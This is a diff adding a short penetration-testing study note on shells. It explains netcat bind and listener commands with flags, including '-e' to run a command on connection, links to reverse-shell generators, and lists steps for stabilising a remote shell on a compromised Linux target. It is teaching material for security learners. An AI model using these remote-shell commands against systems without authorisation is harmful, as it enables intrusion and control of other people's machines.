@@ -1,0 +1,33 @@
+A shell is a program (cmd.exe, powershell, bash etc.) that allows us to execute cmds and have them be interpreted by the system. Often when achieving Arb. Code. Exe., we've gotten a program to run code of our choosing, and that is often a shell of some sort.
+
+Excellent Place to create shells w/ custom parameters:
+https://www.revshells.com/
+https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
+
+Netcat:
+
+Commonly used. Typical cmd:
+nc -lvnp <port to listen on> -e <cmd>
+-l -> Listener
+-v -> Verbose
+-p -> Listener port
+-n -> Do not resolve hostnames
+-e -> Exe. this cmd on successfull connection
+
+nc <TARGET IP> <TARGET PORT> 
+Simply connects to a listening port. Can connect to bind shell
+
+Stabalizing NC
+Vanilla NC is kinda shit. Crashing, shit formatting etc. There are some methods to stablize it and give it more features (Linux targets only for most of these)
+
+1) python -c 'import pty; pty.spawn("/bin/bash")'
+2) export TERM=xterm
+3) Background the shell, followed by: stty raw -echo; fg
+4) Re-enter the shell w/ nc -lvnp <port>
+
+1) rlwrap nc -lvnp <port>
+2) Background the shell, followed by: stty raw -echo; fg
+3) Re-enter the shell 
+
+1) Use socat
+
